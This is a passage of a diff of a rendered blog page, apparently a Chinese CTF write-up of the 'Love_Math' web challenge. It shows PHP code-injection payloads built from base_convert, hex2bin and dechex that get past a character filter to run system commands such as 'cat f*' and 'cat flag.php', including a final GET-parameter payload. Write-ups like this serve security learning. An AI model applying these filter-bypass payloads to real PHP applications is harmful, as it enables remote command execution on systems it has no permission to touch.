-<pre tabindex=0><code>($pi=base_convert),$pi(696468,10,36)($pi(37907361743,10,36)(7267726570206167));
+</code></pre><p>这样我们就可以把<code>*</code>这个十六进制为<code>2a</code>的转成十进制纯数字的了。</p><p>但是我们要怎么利用<code>hex2bin</code>呢，想到可以利用<code>base_convert</code>赋值变量的方式，找到最短的字符串<code>pi</code>，利用<code>$pi=base_convert(37907361743,10,36)</code>构造出<code>hex2bin</code>。</p><p>而且还因为<code>echo</code>可以接受如下的拼接方式，例如</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=k>echo</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=sb>`id`</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=mi>1</span><span class=nx>uid</span><span class=o>=</span><span class=mi>501</span><span class=p>(</span><span class=nx>zedd</span><span class=p>)</span> <span class=nx>gid</span><span class=o>=</span><span class=mi>20</span><span class=p>(</span><span class=nx>staff</span><span class=p>)</span> <span class=nx>groups</span><span class=o>=</span><span class=mi>20</span><span class=p>(</span><span class=nx>staff</span><span class=p>),</span><span class=mi>12</span><span class=p>(</span><span class=nx>everyone</span><span class=p>),</span><span class=mi>61</span><span class=p>(</span><span class=nx>localaccounts</span><span class=p>),</span><span class=mi>79</span><span class=p>(</span><span class=nx>_appserverusr</span><span class=p>),</span><span class=mi>80</span><span class=p>(</span><span class=nx>admin</span><span class=p>),</span><span class=mi>81</span><span class=p>(</span><span class=nx>_appserveradm</span><span class=p>),</span><span class=mi>98</span><span class=p>(</span><span class=nx>_lpadmin</span><span class=p>),</span><span class=mi>501</span><span class=p>(</span><span class=nx>access_bpf</span><span class=p>),</span><span class=mi>701</span><span class=p>(</span><span class=nx>com</span><span class=o>.</span><span class=nx>apple</span><span class=o>.</span><span class=nx>sharepoint</span><span class=o>.</span><span class=nx>group</span><span class=o>.</span><span class=mi>1</span><span class=p>),</span><span class=mi>33</span><span class=p>(</span><span class=nx>_appstore</span><span class=p>),</span><span class=mi>100</span><span class=p>(</span><span class=nx>_lpoperator</span><span class=p>),</span><span class=mi>204</span><span class=p>(</span><span class=nx>_developer</span><span class=p>),</span><span class=mi>250</span><span class=p>(</span><span class=nx>_analyticsusers</span><span class=p>),</span><span class=mi>395</span><span class=p>(</span><span class=nx>com</span><span class=o>.</span><span class=nx>apple</span><span class=o>.</span><span class=nx>access_ftp</span><span class=p>),</span><span class=mi>398</span><span class=p>(</span><span class=nx>com</span><span class=o>.</span><span class=nx>apple</span><span class=o>.</span><span class=nx>access_screensharing</span><span class=p>),</span><span class=mi>399</span><span class=p>(</span><span class=nx>com</span><span class=o>.</span><span class=nx>apple</span><span class=o>.</span><span class=nx>access_ssh</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=k>echo</span> <span class=mi>1</span><span class=p>,</span><span class=sb>`id`</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=mi>1</span><span class=nx>uid</span><span class=o>=</span><span class=mi>501</span><span class=p>(</span><span class=nx>zedd</span><span class=p>)</span> <span class=nx>gid</span><span class=o>=</span><span class=mi>20</span><span class=p>(</span><span class=nx>staff</span><span class=p>)</span> <span class=nx>groups</span><span class=o>=</span><span class=mi>20</span><span class=p>(</span><span class=nx>staff</span><span class=p>),</span><span class=mi>12</span><span class=p>(</span><span class=nx>everyone</span><span class=p>),</span><span class=mi>61</span><span class=p>(</span><span class=nx>localaccounts</span><span class=p>),</span><span class=mi>79</span><span class=p>(</span><span class=nx>_appserverusr</span><span class=p>),</span><span class=mi>80</span><span class=p>(</span><span class=nx>admin</span><span class=p>),</span><span class=mi>81</span><span class=p>(</span><span class=nx>_appserveradm</span><span class=p>),</span><span class=mi>98</span><span class=p>(</span><span class=nx>_lpadmin</span><span class=p>),</span><span class=mi>501</span><span class=p>(</span><span class=nx>access_bpf</span><span class=p>),</span><span class=mi>701</span><span class=p>(</span><span class=nx>com</span><span class=o>.</span><span class=nx>apple</span><span class=o>.</span><span class=nx>sharepoint</span><span class=o>.</span><span class=nx>group</span><span class=o>.</span><span class=mi>1</span><span class=p>),</span><span class=mi>33</span><span class=p>(</span><span class=nx>_appstore</span><span class=p>),</span><span class=mi>100</span><span class=p>(</span><span class=nx>_lpoperator</span><span class=p>),</span><span class=mi>204</span><span class=p>(</span><span class=nx>_developer</span><span class=p>),</span><span class=mi>250</span><span class=p>(</span><span class=nx>_analyticsusers</span><span class=p>),</span><span class=mi>395</span><span class=p>(</span><span class=nx>com</span><span class=o>.</span><span class=nx>apple</span><span class=o>.</span><span class=nx>access_ftp</span><span class=p>),</span><span class=mi>398</span><span class=p>(</span><span class=nx>com</span><span class=o>.</span><span class=nx>apple</span><span class=o>.</span><span class=nx>access_screensharing</span><span class=p>),</span><span class=mi>399</span><span class=p>(</span><span class=nx>com</span><span class=o>.</span><span class=nx>apple</span><span class=o>.</span><span class=nx>access_ssh</span><span class=p>)</span>
+</span></span></code></pre></div><p>尽量取最短的，这里肯定我们就用<code>,</code>这个形式。</p><p>所以大致思路就差不多出来了利用<code>base_convert</code>构造<code>hex2bin</code>，然后用最短的可以执行命令的<code>exec</code>函数去执行<code>cat *</code>的命令</p><pre tabindex=0><code>$pi=base_convert(37907361743,10,36),$pi(65786563)($pi(dechex(426836762666)))
+</code></pre><p>然而没成功&mldr;不知道哪里错了，感觉没道理&mldr;</p><pre tabindex=0><code>($pi=base_convert),$pi(696468,10,36)($pi(37907361743,10,36)(7267726570206167));
 
 ($pi=base_convert),$pi(696468,10,36)($pi(37907361743,10,36)(7267726570202466));
-</code></pre><p>接着队友说可以用<code>rgrep ag</code>去弄，而且本地打通了&mldr;但是远程以上没打通…我又修改了尝试去<code>rgrep fl</code>，也没打通，当时是这样的</p>
-<p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009292.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009292.jpg loading=lazy>
-</a>
-</figure></p>
-<p>写 wp 的时候，突然又发现可以打通了&mldr;</p>
-<p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001335.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001335.jpg loading=lazy>
-</a>
-</figure></p>
-<p>也是神奇&mldr;最后当时还是按照自己的思路去走了，感觉是不是哪里出问题了，确定有<code>flag.php</code>，最后尝试修改<code>cat f*</code>，</p>
-<pre tabindex=0><code>php &gt; echo base_convert('63617420662a',16,10);
+</code></pre><p>接着队友说可以用<code>rgrep ag</code>去弄，而且本地打通了&mldr;但是远程以上没打通…我又修改了尝试去<code>rgrep fl</code>，也没打通，当时是这样的</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009292.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009292.jpg loading=lazy></a></figure></p><p>写 wp 的时候，突然又发现可以打通了&mldr;</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001335.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001335.jpg loading=lazy></a></figure></p><p>也是神奇&mldr;最后当时还是按照自己的思路去走了，感觉是不是哪里出问题了，确定有<code>flag.php</code>，最后尝试修改<code>cat f*</code>，</p><pre tabindex=0><code>php &gt; echo base_convert(&#39;63617420662a&#39;,16,10);
 109270211257898
 php &gt; echo hex2bin(dechex(109270211257898));
 cat f*
 </code></pre><pre tabindex=0><code>$pi=base_convert(37907361743,10,36),$pi(65786563)($pi(dechex(109270211257898)))
-</code></pre><p>拿到 flag（复现环境下）</p>
-<p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001518.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001518.jpg loading=lazy>
-</a>
-</figure></p>
-<pre tabindex=0><code>base_convert(37907361743,10,36)(dechex(1598506324));($$pi){1}(($$pi){2})&amp;1=system&amp;2=cat%20flag.php
-</code></pre><p>剩余一题感觉比较有意思，单独写一下。</p>
-</section>
-<footer class=article-footer>
-<section class=article-tags>
-<a href=/tags/CTF/>CTF</a>
-<a href=/tags/wp/>wp</a>
-</section>
-<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
-<span>Licensed under CC BY-NC-SA 4.0</span>
-</section>
-<div class="notice notice-tip">
-<div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div>
-<p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br>
-<p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br>
-</div>
-</footer>
-</article>
-<aside class=related-contents--wrapper>
-<h2 class=section-title>Related contents</h2>
-<div class=related-contents>
-<div class="flex article-list--tile">
-<article>
-<a href=/2020/04/24/Plaid-CTF-2020-Web-2/>
-<div class=article-details>
-<h2 class=article-title>Plaid CTF 2020 Catalog</h2>
-</div>
-</a>
-</article>
-<article>
-<a href=/2020/04/20/Plaid-CTF-2020-Web-1/>
-<div class=article-details>
-<h2 class=article-title>Plaid CTF 2020 Contrived Web Problem Write Up</h2>
-</div>
-</a>
-</article>
-<article>
-<a href=/2019/06/04/2019qwb/>
-<div class=article-details>
-<h2 class=article-title>2019强网杯部分Web wp</h2>
-</div>
-</a>
-</article>
-<article>
-<a href=/2019/05/30/2019iscc/>
-<div class=article-details>
-<h2 class=article-title>2019 ISCC Web wp</h2>
-</div>
-</a>
-</article>
-<article>
-<a href=/2019/05/09/2019ciscn-RefSpace/>
-<div class=article-details>
-<h2 class=article-title>2019 CISCN RefSpace</h2>
-</div>
-</a>
-</article>
-</div>
-</div>
-</aside>
-<div class=disqus-container>
-<div id=disqus_thread></div>
-<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//ZeddYu.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
-<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
-<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
-</div>
-<style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style>
-<script>window.addEventListener('onColorSchemeChange',a=>{DISQUS&&DISQUS.reset({reload:!0})})</script>
-<footer class=site-footer>
-<section class=copyright>
-&copy;
+</code></pre><p>拿到 flag（复现环境下）</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001518.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001518.jpg loading=lazy></a></figure></p><pre tabindex=0><code>base_convert(37907361743,10,36)(dechex(1598506324));($$pi){1}(($$pi){2})&amp;1=system&amp;2=cat%20flag.php
+</code></pre><p>剩余一题感觉比较有意思，单独写一下。</p></section><footer class=article-footer><section class=article-tags><a href=/tags/CTF/>CTF</a>
+<a href=/tags/wp/>wp</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section><div class="notice notice-tip"><div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div><p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br><p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br></div></footer></article><aside class=related-contents--wrapper><h2 class=section-title>Related contents</h2><div class=related-contents><div class="flex article-list--tile"><article><a href=/2020/04/24/Plaid-CTF-2020-Web-2/><div class=article-details><h2 class=article-title>Plaid CTF 2020 Catalog</h2></div></a></article><article><a href=/2020/04/20/Plaid-CTF-2020-Web-1/><div class=article-details><h2 class=article-title>Plaid CTF 2020 Contrived Web Problem Write Up</h2></div></a></article><article><a href=/2019/06/04/2019qwb/><div class=article-details><h2 class=article-title>2019强网杯部分Web wp</h2></div></a></article><article><a href=/2019/05/30/2019iscc/><div class=article-details><h2 class=article-title>2019 ISCC Web wp</h2></div></a></article><article><a href=/2019/05/09/2019ciscn-RefSpace/><div class=article-details><h2 class=article-title>2019 CISCN RefSpace</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//ZeddYu.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{DISQUS&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
 2018 -
-2022 Zeddy's Blog
-</section>
-<section class=powerby>
-Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
-Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
-</section>
-</footer>
-<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
-<div class=pswp__bg></div>
-<div class=pswp__scroll-wrap>
-<div class=pswp__container>
-<div class=pswp__item></div>
-<div class=pswp__item></div>
-<div class=pswp__item></div>
-</div>
-<div class="pswp__ui pswp__ui--hidden">
-<div class=pswp__top-bar>
-<div class=pswp__counter></div>
-<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+2022 Zeddy's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
 <button class="pswp__button pswp__button--share" title=Share></button>
 <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-<div class=pswp__preloader>
-<div class=pswp__preloader__icn>
-<div class=pswp__preloader__cut>
-<div class=pswp__preloader__donut></div>
-</div>
-</div>
-</div>
-</div>
-<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-<div class=pswp__share-tooltip></div>
-</div>
-<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-</button>
-<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-</button>
-<div class=pswp__caption>
-<div class=pswp__caption__center></div>
-</div>
-</div>
-</div>
-</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
-</main>
-<aside class="sidebar right-sidebar sticky">
-<section class="widget archives">
-<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
-</div>
-<h2 class="widget-title section-title">Table of contents</h2>
-<div class=widget--toc>
-<nav id=TableOfContents>
-<ol>
-<li><a href=#web>Web</a>
-<ol>
-<li><a href=#justsoso>JustSoso</a></li>
-<li><a href=#全宇宙最简单的sql>全宇宙最简单的SQL</a></li>
-</ol>
-</li>
-</ol>
-<ol>
-<li><a href=#web-1>Web</a>
-<ol>
-<li><a href=#love_math>Love_Math</a></li>
-</ol>
-</li>
-</ol>
-</nav>
-</div>
-</section>
-</aside>
-</div>
-<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
-<script>'serviceWorker'in navigator&&window.addEventListener('load',function(){navigator.serviceWorker.register('/sw.js')})</script>
-<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
-</body>
-</html>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous></main><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#web>Web</a><ol><li><a href=#justsoso>JustSoso</a></li><li><a href=#全宇宙最简单的sql>全宇宙最简单的SQL</a></li></ol></li></ol><ol><li><a href=#web-1>Web</a><ol><li><a href=#love_math>Love_Math</a></li></ol></li></ol></nav></div></section></aside></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
+<script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("/sw.js")})</script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
